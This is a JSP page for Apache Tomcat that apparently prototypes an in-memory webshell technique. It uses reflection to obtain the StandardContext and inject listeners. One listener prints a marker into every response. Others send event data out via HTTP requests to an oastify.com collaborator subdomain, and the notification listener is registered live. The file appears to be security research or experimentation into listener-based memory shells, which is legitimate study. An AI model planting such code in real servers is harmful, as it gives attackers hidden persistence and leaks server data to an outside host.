<%@ page import="javax.servlet.ServletRequestListener"%>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.LifecycleListener" %>
<%@ page import="org.apache.catalina.LifecycleEvent" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.net.HttpURLConnection" %>
<%@ page import="java.net.ProtocolException" %>
<%@ page import="javax.management.NotificationListener" %>
<%@ page import="javax.management.Notification" %>
<%@ page import="javax.management.AttributeChangeNotificationFilter" %>
<%@ page import="java.io.IOException" %>
<%@ page import="javax.management.NotificationFilter" %>
<%@ page import="org.apache.catalina.ContainerListener" %>
<%@ page import="org.apache.catalina.ContainerEvent" %>
<%@ page import="java.beans.PropertyChangeListener" %>
<%@ page import="java.beans.PropertyChangeEvent" %>
<%
    // context
    Field f = request.getClass().getDeclaredField("request");
    f.setAccessible(true);//因为是protected
    Request req = (Request) f.get(request);//反射获取值
    StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext

    ServletRequestListener listener = new ServletRequestListener() {

        public void requestDestroyed(ServletRequestEvent sre) {
        }

        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            try {
                Field reqField = req.getClass().getDeclaredField("request");
                reqField.setAccessible(true);
                // org.apache.catalina.connector.Request
                Object reqObj = reqField.get(req);
                // org.apache.catalina.connector.Response
                HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod("getResponse").invoke(reqObj);
                PrintWriter out = rep.getWriter();
                // rep.sendError(404);
                out.println("listener_xjj_test");
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    };

    LifecycleListener lifecycleListener = new LifecycleListener() {
        @Override
        public void lifecycleEvent(LifecycleEvent lifecycleEvent) {
            try {
                String url = String.format("http://%s.kpdqe2die2cb57xb28zkf1kp6gc70xom.oastify.com", lifecycleEvent.getData());
                URL obj = new URL(url);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("GET");
                con.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };

    NotificationListener notificationListener = new NotificationListener() {
        @Override
        public void handleNotification(Notification notification, Object handback) {
            try {
                String url = String.format("http://%s.kpdqe2die2cb57xb28zkf1kp6gc70xom.oastify.com", notification.getUserData());
                URL obj = new URL(url);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("GET");
                con.getResponseCode();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    };

//    context.addApplicationEventListener(listener);
//    context.addLifecycleListener(lifecycleListener);
//    context.addApplicationLifecycleListener(lifecycleListener);
    context.addNotificationListener(notificationListener, (NotificationFilter) notification -> false, new Object());
    context.addContainerListener(containerEvent -> {
        // ...
    });
    context.addPropertyChangeListener(evt -> {
        // ...
    });
%>